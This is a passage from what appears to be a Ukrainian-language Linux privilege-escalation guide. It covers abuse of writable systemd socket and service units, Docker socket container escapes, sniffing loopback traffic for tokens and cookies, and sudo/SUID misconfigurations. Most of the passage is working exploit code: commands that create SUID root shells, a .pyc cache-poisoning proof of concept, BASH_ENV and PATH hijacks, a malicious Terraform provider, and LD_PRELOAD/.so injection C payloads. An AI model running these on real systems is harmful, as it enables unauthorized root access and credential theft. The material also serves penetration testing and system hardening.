- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ці опції відрізняються, але загалом використовуються, щоб **вказати, де саме сокет буде прослуховувати** (шлях до AF_UNIX socket file, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: приймає boolean-аргумент. Якщо **true**, для **кожного вхідного підключення створюється окремий service instance**, якому передається лише socket підключення. Якщо **false**, усі listening sockets **передаються запущеному service unit**, і для всіх підключень створюється лише один service unit. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові daemons так, щоб вони працювали з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: приймають один або кілька рядків команд, які **виконуються до** або **після** створення та прив’язування listening **sockets**/FIFOs відповідно. Перший token у рядку команди має бути абсолютним ім’ям файлу, після якого вказуються аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: додаткові **команди**, які **виконуються до** або **після** закриття та видалення listening **sockets**/FIFOs відповідно.
- `Service`: визначає ім’я **service** unit, який потрібно **активувати** у разі **вхідного трафіку**. Цей параметр дозволений лише для сокетів із `Accept=no`. За замовчуванням використовується service із таким самим іменем, як у socket (із заміною suffix). У більшості випадків використовувати цю опцію не потрібно.

### Writable .socket files

Якщо ви знайдете **writable** `.socket` file, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor`, після чого backdoor буде виконано перед створенням сокета. Тому вам, **імовірно, доведеться дочекатися перезавантаження машини.**\
_Зверніть увагу, що система має використовувати конфігурацію цього socket file, інакше backdoor не буде виконано_

### Socket activation + writable unit path (create missing service)

Ще одна небезпечна помилка конфігурації:

- socket unit із `Accept=no` і `Service=<name>.service`
- вказаний service unit відсутній
- attacker може записувати до `/etc/systemd/system` (або іншого unit search path)

У такому випадку attacker може створити `<name>.service`, а потім надіслати трафік до сокета, щоб systemd завантажив і виконав новий service від імені root.

Короткий перебіг:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Сокети з правом запису

Якщо ви **виявили будь-який сокет із правом запису** (_зараз ми говоримо про Unix-сокети, а не про конфігураційні файли `.socket`_), тоді **ви можете взаємодіяти** з цим сокетом і, можливо, скористатися вразливістю.

### Перерахування Unix-сокетів
```bash
netstat -a -p --unix
```
### Необроблене з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-сокети

Зверніть увагу, що можуть існувати деякі **сокети, що прослуховують HTTP**-запити (_я не маю на увазі файли .socket, а файли, що діють як unix-сокети_). Перевірити це можна за допомогою:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Якщо сокет **відповідає HTTP**-запитом, тоді ви можете **взаємодіяти** з ним і, можливо, **експлуатувати певну вразливість**.

### Writable Docker Socket

Сокет Docker, який часто знаходиться за шляхом `/var/run/docker.sock`, є критично важливим файлом, який слід захищати. За замовчуванням він доступний для запису користувачу `root` і учасникам групи `docker`. Наявність доступу на запис до цього сокета може призвести до підвищення привілеїв. Нижче наведено пояснення цього процесу, а також альтернативні методи на випадок, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є доступ на запис до сокета Docker, ви можете підвищити привілеї за допомогою таких команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дають змогу запустити контейнер із доступом на рівні root до файлової системи хоста.

#### **Безпосереднє використання Docker API**

Якщо Docker CLI недоступний, Docker socket усе одно можна використовувати через Docker API та команди `curl`.

1.  **Список Docker Images:** Отримати список доступних images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Створення контейнера:** Надіслати запит на створення контейнера, який монтує кореневий каталог хостової системи.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Підключення до контейнера:** Використайте `socat` для встановлення з’єднання з контейнером, що дасть змогу виконувати в ньому команди.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення з’єднання через `socat` ви можете безпосередньо виконувати команди в контейнері з доступом на рівні root до файлової системи хоста.

### Інше

Зверніть увагу: якщо ви маєте дозволи на запис у docker socket, оскільки перебуваєте **в групі `docker`**, у вас є [**інші способи підвищити привілеї**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API прослуховує порт**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), його також можна скомпрометувати.

Дізнайтеся про **інші способи вийти з контейнерів або зловживати container runtimes для підвищення привілеїв** тут:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Підвищення привілеїв через Containerd (ctr)

Якщо ви виявили, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **можливо, ви зможете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Підвищення привілеїв через **RunC**

Якщо ви виявили, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **можливо, ви зможете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **система міжпроцесної комунікації (IPC)**, яка дає змогу застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасних Linux-систем, вона пропонує надійну інфраструктуру для різних форм комунікації між застосунками.

Система є універсальною та підтримує базовий IPC, який покращує обмін даними між процесами й нагадує **розширені UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, забезпечуючи безперебійну інтеграцію між компонентами системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити музичний програвач вимкнути звук, покращуючи взаємодію з користувачем. D-Bus також підтримує систему віддалених об’єктів, спрощуючи запити до сервісів і виклики методів між застосунками та оптимізуючи процеси, які традиційно були складними.

D-Bus працює за **моделлю allow/deny**, керуючи дозволами на повідомлення (виклики методів, надсилання сигналів тощо) на основі сукупного ефекту відповідних правил політик. Ці політики визначають взаємодію з bus і потенційно дають змогу підвищити привілеї через експлуатацію цих дозволів.

Приклад такої політики у `/etc/dbus-1/system.d/wpa_supplicant.conf` містить дозволи для користувача root володіти повідомленнями від `fi.w1.wpa_supplicant1`, надсилати їх і отримувати їх.

Політики без указаного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх випадків, не охоплених іншими конкретними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як проводити enumeration та exploit комунікації D-Bus тут:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво провести enumeration мережі та визначити розташування машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Швидкий аналіз вихідної фільтрації

Якщо на хості можна виконувати команди, але callback не спрацьовують, швидко розділіть фільтрацію DNS, транспорту, проксі та маршрутів:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Відкриті порти

Завжди перевіряйте мережеві служби, що працюють на комп'ютері, з якими вам не вдалося взаємодіяти до отримання доступу до нього:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Класифікуйте listeners за bind target:

- `0.0.0.0` / `[::]`: доступні через усі локальні інтерфейси.
- `127.0.0.1` / `::1`: доступні лише локально (хороші кандидати для tunnel/forward).
- Конкретні внутрішні IP-адреси (наприклад, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Workflow triage для локальних сервісів

Після компрометації host сервіси, прив'язані до `127.0.0.1`, часто вперше стають доступними з вашої shell. Швидкий локальний workflow:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS як network scanner (network-only mode)

Окрім локальних перевірок PE, linPEAS може працювати як спеціалізований network scanner. Він використовує доступні бінарні файли з `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює додаткові інструменти.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Якщо ви передасте `-d`, `-p` або `-i` без `-t`, linPEAS працюватиме як чистий network scanner (пропускаючи решту перевірок privilege escalation).

### Sniffing

Перевірте, чи можете ви перехоплювати трафік. Якщо так, ви зможете отримати облікові дані.
```
timeout 1 tcpdump
```
Швидкі практичні перевірки:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) особливо цінний під час post-exploitation, оскільки багато внутрішніх сервісів, доступних лише локально, розкривають там токени/кукі/облікові дані:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Захоплюй зараз, аналізуй пізніше:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Користувачі

### Загальне перерахування

Перевірте, **хто** ви, які **привілеї** ви маєте, які **користувачі** є в системі, хто з них може виконувати **login**, а хто має **привілеї root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були вразливими до помилки, яка дозволяє користувачам із **UID > INT_MAX** підвищувати привілеї. Докладніше: [тут](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [тут](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) і [тут](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатуйте її** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **учасником групи**, яка може надати вам root-привілеї:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи міститься в буфері обміну щось цікаве (якщо це можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** у середовищі, **спробуйте увійти як кожен користувач**, використовуючи цей пароль.

### Su Brute

Якщо ви не проти створити багато шуму, а бінарні файли `su` і `timeout` присутні на комп’ютері, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається виконати brute-force користувачів.

## Зловживання доступним для запису PATH

### $PATH

Якщо ви виявите, що можете **записувати в будь-яку папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у доступній для запису папці** з іменем певної команди, яка буде виконана іншим користувачем (в ідеалі root) і яка **не завантажується з папки, розташованої в $PATH раніше**, ніж ваша доступна для запису папка.

### SUDO і SUID

Вам може бути дозволено виконувати певні команди за допомогою sudo, або вони можуть мати біт suid. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дають змогу читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволяти користувачу виконувати певні команди з привілеями іншого користувача, не знаючи пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` від імені `root`; тепер легко отримати shell, додавши ssh key до директорії root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **заснований на машині HTB Admirer**, був **вразливим** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну бібліотеку Python під час виконання скрипту від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Отруєння доступного для запису `__pycache__` / `.pyc` в імпортах Python, дозволених через sudo

Якщо **Python-скрипт, дозволений через sudo**, імпортує модуль, директорія пакета якого містить **доступний для запису `__pycache__`**, ви можете замінити кешований `.pyc` і отримати виконання коду від імені привілейованого користувача під час наступного імпорту.

- Чому це працює:
- CPython зберігає кеші байткоду в `__pycache__/module.cpython-<ver>.pyc`.
- Інтерпретатор перевіряє **заголовок** (magic + метадані timestamp/hash, пов'язані з source), а потім виконує marshaled code object, що зберігається після цього заголовка.
- Якщо ви можете **видалити та повторно створити** кешований файл, оскільки директорія доступна для запису, файл `.pyc`, власником якого є root і який не доступний для запису, все одно можна замінити.
- Типовий шлях:
- `sudo -l` показує Python-скрипт або wrapper, який можна запустити від імені root.
- Цей скрипт імпортує локальний модуль з `/opt/app/`, `/usr/local/lib/...` тощо.
- Директорія `__pycache__` імпортованого модуля доступна для запису вашому користувачеві або всім.

Швидке перерахування:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Якщо ви можете перевірити привілейований скрипт, визначте імпортовані модулі та шлях до їхнього кешу:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Сценарій зловживання:

1. Один раз запустіть скрипт, дозволений через sudo, щоб Python створив легітимний файл кешу, якщо його ще немає.
2. Прочитайте перші 16 байтів із легітимного `.pyc` і повторно використайте їх у отруєному файлі.
3. Скомпілюйте об’єкт коду payload, виконайте для нього `marshal.dumps(...)`, видаліть оригінальний файл кешу та створіть його знову, використовуючи оригінальний заголовок і шкідливий bytecode.
4. Повторно запустіть скрипт, дозволений через sudo, щоб імпорт виконав ваш payload від імені root.

Важливі примітки:

- Повторне використання оригінального заголовка є ключовим, оскільки Python перевіряє метадані кешу щодо source file, а не те, чи справді тіло bytecode відповідає source file.
- Це особливо корисно, коли source file належить root і недоступний для запису, але директорія, що містить `__pycache__`, доступна для запису.
- Атака не спрацює, якщо privileged process використовує `PYTHONDONTWRITEBYTECODE=1`, імпортує з location із безпечними permissions або забороняє запис у кожну директорію в import path.

Мінімальна форма proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Посилення захисту:

- Переконайтеся, що жоден каталог у privileged Python import path не доступний для запису користувачам із низькими привілеями, включно з `__pycache__`.
- Для privileged runs розгляньте можливість використання `PYTHONDONTWRITEBYTECODE=1` і періодичних перевірок на наявність неочікуваних доступних для запису каталогів `__pycache__`.
- Ставтеся до доступних для запису локальних Python-модулів і каталогів кешу так само, як до доступних для запису shell-скриптів або shared libraries, що виконуються від імені root.

### BASH_ENV preserved via sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати поведінку Bash під час запуску non-interactive shell, щоб виконати довільний код від імені root під час виклику дозволеної команди.

- Чому це працює: Для non-interactive shell Bash обчислює `$BASH_ENV` і source-ить цей файл перед виконанням цільового скрипту. Багато правил sudo дозволяють запускати скрипт або shell wrapper. Якщо `BASH_ENV` зберігається sudo, ваш файл буде source-нуто з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` у non-interactive режимі, або будь-який bash-скрипт).
- `BASH_ENV` наявний у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Посилення захисту:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні binaries.
- Розгляньте I/O logging через sudo та сповіщення у разі використання збережених env vars.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo залишає середовище без змін (`!env_reset`), дозволяючи виконання `terraform apply`, значення `$HOME` залишається таким, як у користувача, що викликає команду. Тому Terraform завантажує **$HOME/.terraformrc** від імені root і враховує `provider_installation.dev_overrides`.

- Вкажіть для потрібного provider доступний для запису каталог і розмістіть у ньому шкідливий plugin з іменем provider (наприклад, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform не пройде handshake із Go plugin, але виконає payload від root, перш ніж завершити роботу, залишивши SUID shell.

### Перевизначення TF_VAR + обхід перевірки symlink

Змінні Terraform можна передати через змінні середовища `TF_VAR_<name>`, які зберігаються, коли sudo зберігає середовище. Слабкі перевірки, такі як `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, можна обійти за допомогою symlink:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform розв’язує symlink і копіює справжній `/root/root.txt` у destination, доступний для читання attacker'ом. Такий самий підхід можна використовувати, щоб **записувати** у privileged paths, заздалегідь створюючи symlink'и в destination (наприклад, спрямовуючи destination path провайдера всередину `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo можна налаштувати з `requiretty`, що змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опція відсутня), sudo можна виконувати з non-interactive contexts, таких як reverse shells, cron jobs або scripts.
```bash
Defaults !requiretty
```
Це не є прямою вразливістю саме по собі, але розширює перелік ситуацій, у яких правила sudo можна зловживати без необхідності повноцінного PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, що містить записи, доступні для запису attacker'ом (наприклад, `/home/<user>/bin`), будь-яку відносну команду всередині дозволеного через sudo target можна підмінити.

- Вимоги: правило sudo (часто `NOPASSWD`), яке запускає script/binary, що викликає команди без абсолютних шляхів (`free`, `df`, `ps` тощо), і запис PATH із доступом на запис, який перевіряється першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Обхід шляхів під час виконання через Sudo
**Переходьте** для читання інших файлів або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Заходи протидії**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо **дозвіл sudo** надано для окремої команди **без зазначення шляху**: _hacker10 ALL= (root) less_, це можна exploit, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цей technique також можна використати, якщо бінарний файл **suid** **виконує іншу команду без зазначення шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст підозрілого бінарного файлу SUID)**.

[Приклади payload для виконання.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Бінарний файл SUID зі шляхом до команди

Якщо бінарний файл **suid** **виконує іншу команду із зазначенням шляху**, тоді можна спробувати **експортувати функцію** з назвою команди, яку викликає файл suid.

Наприклад, якщо бінарний файл suid викликає _**/usr/sbin/service apache2 start**_, потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Потім, коли ви викличете suid binary, цю функцію буде виконано

### Записуваний скрипт, виконуваний SUID wrapper

Поширена помилка конфігурації custom-app — це wrapper для root-owned SUID binary, який виконує скрипт, тоді як сам скрипт доступний для запису low-priv користувачам.

Типовий шаблон:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Якщо `/usr/local/bin/backup.sh` доступний для запису, ви можете додати команди payload, а потім виконати SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Швидкі перевірки:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Цей attack path особливо поширений у "maintenance"/"backup" wrappers, що постачаються в `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказання однієї або кількох shared libraries (файлів .so), які loader завантажує перед усіма іншими, зокрема стандартною C library (`libc.so`). Цей процес називається preloading library.

Однак для підтримання безпеки системи та запобігання exploitation цієї функції, особливо за використання **suid/sgid** executables, система застосовує певні умови:

- Loader ігнорує **LD_PRELOAD** для executables, у яких реальний user ID (_ruid_) не збігається з effective user ID (_euid_).
- Для executables із suid/sgid preloaded будуть лише libraries зі standard paths, які також мають suid/sgid.

Privilege escalation може відбутися, якщо ви маєте можливість виконувати команди за допомогою `sudo`, а вивід `sudo -l` містить твердження **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися та розпізнаватися навіть під час виконання команд за допомогою `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **підвищте привілеї**, запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc можна використати, якщо зловмисник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, у якому буде виконуватися пошук бібліотек.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Під час роботи з бінарним файлом із правами **SUID**, який здається незвичайним, варто перевірити, чи правильно він завантажує файли **.so**. Це можна перевірити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, помилка на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб скористатися цим, потрібно створити файл C, наприклад _"/path/to/.config/libcalc.c"_, що міститиме наведений нижче код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код після компіляції та виконання має на меті підвищити привілеї шляхом маніпулювання дозволами файлів і запуску shell із підвищеними привілеями.

